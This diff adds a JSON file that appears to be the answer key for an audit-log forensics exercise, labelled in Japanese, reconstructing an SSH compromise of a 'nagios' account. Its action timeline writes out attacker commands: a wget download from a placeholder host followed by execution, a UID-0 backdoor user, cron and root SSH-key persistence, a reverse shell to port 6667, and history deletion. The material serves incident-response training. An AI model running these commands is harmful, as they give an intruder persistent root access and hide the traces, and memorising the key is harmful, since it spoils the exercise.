@@ -1,0 +1,108 @@
+{
+  "compromised": true,
+  "attacker_ip": "203.0.113.112",
+  "account": "nagios",
+  "account_uid": 1003,
+  "session_ses": 4,
+  "login_success": {
+    "time_jst": "2026-11-12 00:04:41",
+    "epoch": 1794409481.977,
+    "serial": 21885
+  },
+  "brute_force": {
+    "first": {
+      "time_jst": "2026-11-12 00:04:29",
+      "epoch": 1794409469.464,
+      "serial": 21863
+    },
+    "attempts_root": 5,
+    "attempts_backup": 1
+  },
+  "actions": [
+    {
+      "step": "偵察",
+      "detail": "id / uname -a / cat /etc/passwd"
+    },
+    {
+      "step": "ダウンロード",
+      "detail": "sudo wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh",
+      "time_jst": "2026-11-12 00:05:13",
+      "epoch": 1794409513.38,
+      "serial": 21917
+    },
+    {
+      "step": "実行権限付与",
+      "detail": "sudo chmod +x /tmp/.run.sh"
+    },
+    {
+      "step": "実行",
+      "detail": "sudo bash /tmp/.run.sh",
+      "time_jst": "2026-11-12 00:05:21",
+      "epoch": 1794409521.658,
+      "serial": 21937
+    },
+    {
+      "step": "持続化：UID 0 の利用者追加",
+      "detail": "useradd -o -u 0 -g 0 ... logsync（ADD_USER と /etc/passwd・/etc/shadow への書き込み）",
+      "time_jst": "2026-11-12 00:05:22",
+      "epoch": 1794409522.639,
+      "serial": 21941
+    },
+    {
+      "step": "持続化：cron",
+      "detail": "/etc/cron.d/logsync を新規作成（key=cron）",
+      "time_jst": "2026-11-12 00:05:23",
+      "epoch": 1794409523.508,
+      "serial": 21950
+    },
+    {
+      "step": "持続化：SSH 鍵",
+      "detail": "/root/.ssh/authorized_keys に書き込み（key=rootkey）",
+      "time_jst": "2026-11-12 00:05:24",
+      "epoch": 1794409524.078,
+      "serial": 21951
+    },
+    {
+      "step": "外部への通信（リバースシェル）",
+      "detail": "connect → 198.51.100.34:6667（SOCKADDR）",
+      "time_jst": "2026-11-12 00:05:25",
+      "epoch": 1794409525.095,
+      "serial": 21954
+    },
+    {
+      "step": "痕跡の消去",
+      "detail": "/home/nagios/.bash_history を削除（key=delete）",
+      "time_jst": "2026-11-12 00:06:04",
+      "epoch": 1794409564.645,
+      "serial": 21959
+    },
+    {
+      "step": "ログアウト",
+      "time_jst": "2026-11-12 00:06:12",
+      "epoch": 1794409572.565,
+      "serial": 21966
+    }
+  ],
+  "c2": {
+    "ip": "198.51.100.34",
+    "port": 6667,
+    "saddr": "02001A0BC63364220000000000000000"
+  },
+  "persistence": [
+    "UID 0 の利用者 logsync",
+    "/etc/cron.d/logsync",
+    "/root/.ssh/authorized_keys"
+  ],
+  "backdoor_user": "logsync",
+  "script": "run.sh",
+  "distractors": [
+    "192.0.2.0/24 からの無効な利用者名での失敗ログイン（無差別な総当たり。侵入には至っていない）",
+    "deploy の sudo systemctl reload nginx（正規の運用）",
+    "tanaka の passwd（USER_CHAUTHTOK。自分のパスワード変更で正常）"
+  ],
+  "key_points": [
+    "sudo で root になっても auid=1003（nagios）のまま。誰の操作かは auid で追う",
+    "USER_CMD の cmd と PROCTITLE は16進数。解読するとコマンドがわかる",
+    "SOCKADDR の saddr: 0200=AF_INET、次の4桁がポート、次の8桁が IPv4 アドレス"
+  ]
+}
